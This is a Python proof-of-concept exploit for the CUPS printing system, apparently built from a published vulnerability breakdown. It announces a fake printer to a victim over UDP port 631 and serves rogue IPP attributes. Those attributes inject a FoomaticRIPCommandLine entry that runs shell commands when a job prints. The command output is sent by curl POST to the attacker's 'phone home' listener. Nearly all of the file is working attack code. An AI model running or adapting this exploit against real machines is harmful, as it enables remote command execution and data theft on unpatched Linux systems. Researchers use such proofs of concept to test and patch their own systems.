import socket
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from time import sleep

import ippserver
import ippserver.behaviour
import ippserver.constants
import ippserver.request
import ippserver.server
from ippserver.constants import SectionEnum, TagEnum

# ! CREDIT IS DUE: https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/ (amazing breakdown)

victim_ip = '192.168.122.183'
victim_port = 631  # cups UDP port
attacker_ip = '192.168.122.1'
attacker_port = 8000  # IPP server (http)
attacker_listen_ip = attacker_ip  # or use '0.0.0.0'
attacker_printer_name = '192_168_122_1'

attacker_ip_port = f"{attacker_ip}:{attacker_port}"
attacker_ipp_printer = f"ipp://{attacker_ip}:{attacker_port}/printers/whatever"  # TODO merge w/ ipp:// uses below once I test to validate not broken
attacker_http_printer = f"http://{attacker_ip}:{attacker_port}/printers/whatever"
attacker_phone_home = f"http://{attacker_ip}:{attacker_port}/phone/home"


def malicious_attributes():

    # FYI reading /etc/cups/ppd/*.ppd requires root, hence why use this as a demo:
    malicious_cmd = f"(whoami && echo ' ||| ' && wc /etc/cups/ppd/{attacker_printer_name}.ppd && echo ' ||| ' && ls -al /etc/cups/ppd) 2>&1 | curl -X POST {attacker_phone_home} -d @-"
    malicious_cmd_bytes = bytes('"' + malicious_cmd + '"', encoding="utf-8")  # wrap in "..."

    # FYI printer-more-info => *APSupplies: "https://www.google.com/"
    # FYI printer-privacy-policy-uri => IIRC CupsPrivacyUri/Policy
    # on ubuntu24.04 w/o security patches both printer-more-info and printer-privacy-policy-uri WORK

    return {
        (SectionEnum.printer, b'printer-more-info', TagEnum.uri): [
            # FYI first and final " are added by string format
            b"""https://www.google.com/"
*FoomaticRIPCommandLine: """ + malicious_cmd_bytes + b"""
*cupsFilter2 : "application/pdf application/vnd.cups-postscript 0 foomatic-rip"""
        ],
    }


class AttackerIPPServerHandler(BaseHTTPRequestHandler):

    statelessPrinter = ippserver.behaviour.StatelessPrinter()

    def send_headers(self, status=200, content_type='text/plain', content_length=None):
        self.log_request(status)
        self.send_response_only(status, None)
        self.send_header('Server', 'ipp-server')
        self.send_header('Date', self.date_time_string())
        self.send_header('Content-Type', content_type)
        if content_length:
            self.send_header('Content-Length', '%u' % content_length)
        self.send_header('Connection', 'close')
        self.end_headers()

    def handle_phone_home(self):

        print("[HEADERS]:")
        for h in self.headers:
            print(f"  {h}: {self.headers[h]}")

        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(
            content_length)  # leave as bytes, that way non-printable chars still show
        print(f"[PHONE_HOME]: {post_data}")

        self.send_response(200)
        self.end_headers()

    def do_POST(self):
        if (self.path.startswith("/phone/home")):
            self.handle_phone_home()
            return

        self.statelessPrinter.version = (1, 1)
        # TODO how about move this definition to top too? attacker_ipp_base_uri
        self.statelessPrinter.base_uri = b'ipp://' + bytes(attacker_ip_port, encoding="utf-8")
        # TODO can I use attackr_ipp_printer here? # TODO do this after testing the initial cleanup still works
        self.statelessPrinter.printer_uri = b'ipp://' + bytes(
            attacker_ip_port, encoding="utf-8") + b'/printer'

        ipp_request = ippserver.request.IppRequest.from_file(self.rfile)
        print(f"request version: {ipp_request.version}, opid: {ipp_request.opid_or_status}")
        print(f"request: {ipp_request.to_string()}")

        attributes = self.statelessPrinter.printer_list_attributes()
        attributes.update(malicious_attributes())

        ipp_response = ippserver.request.IppRequest(
            self.statelessPrinter.version, ippserver.constants.StatusCodeEnum.ok, ipp_request.request_id, attributes)
        ipp_response_string = ipp_response.to_string()
        print(f"response version: {ipp_response.version}, opid: {ipp_response.opid_or_status}")
        print(f"response: {ipp_response_string}")

        self.send_headers(
            status=200, content_type='application/ipp', content_length=len(ipp_response_string))
        self.wfile.write(ipp_response_string)

    def do_GET(self):

        print("GET\n")
        print(self.headers)
        print(self.path)

        self.send_response(500)
        self.end_headers()
        self.wfile.write(b'FAIL')

    def do_PUT(self):
        print("PUT\n")
        print(self.headers)
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(post_data)

        self.send_response(500)
        self.end_headers()
        self.wfile.write(b'FAIL')

    def do_DELETE(self):
        print("DELETE\n")
        print(self.headers)
        print(self.path)

        self.send_response(500)
        self.end_headers()
        self.wfile.write(b'FAIL')

    def do_HEAD(self):
        print("HEAD\n")
        print(self.headers)
        print(self.path)

        self.send_response(500)
        self.end_headers()
        self.wfile.write(b'FAIL')


def start_server():
    server_address = (attacker_listen_ip, attacker_port)
    httpd = HTTPServer(server_address, AttackerIPPServerHandler)
    print("Starting server")
    httpd.serve_forever()


server_thread = threading.Thread(target=start_server)
# server_thread.daemon = True  # Allows the thread to exit when the main program does, or don't set this to just let it run indefinitely
server_thread.start()

sleep(1)


def send_udp_packet(ip, port, message):
    print("sending")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(message.encode('utf-8'), (ip, port))
    sock.close()


# FYI other test code in the original impl.
IMPERSONATE_PRINTER = True
if IMPERSONATE_PRINTER:
    callback_url = f"0 3 {attacker_http_printer}"

    send_udp_packet(victim_ip, victim_port, callback_url)
    print("sent")
